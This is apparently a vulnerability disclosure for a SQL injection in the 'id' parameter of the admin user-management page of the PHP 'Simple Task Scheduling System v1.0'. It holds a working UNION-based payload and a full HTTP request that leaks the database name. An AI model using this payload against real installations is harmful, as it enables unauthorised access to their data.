# Simple Task Scheduling System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15328/simple-task-scheduler-system-phpoop-free-source-code.html

The program is built using the xmapp-php5.6 version

Vulnerability File: /tss/admin/?page=user/manage_user&id=

Vulnerability location: /tss/admin/?page=user/manage_user&id=, id

db_name = tss_db;length=6

[+] Payload: /tss/admin/?page=user/manage_user&id=-7%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11--+ // Leak place ---> id

```sql
GET /tss/admin/?page=user/manage_user&id=-7%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=tc6akb10bh652defck09t9eug4
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/179391954-1faf970a-02cf-4aa4-93ed-f553c28921e2.png)
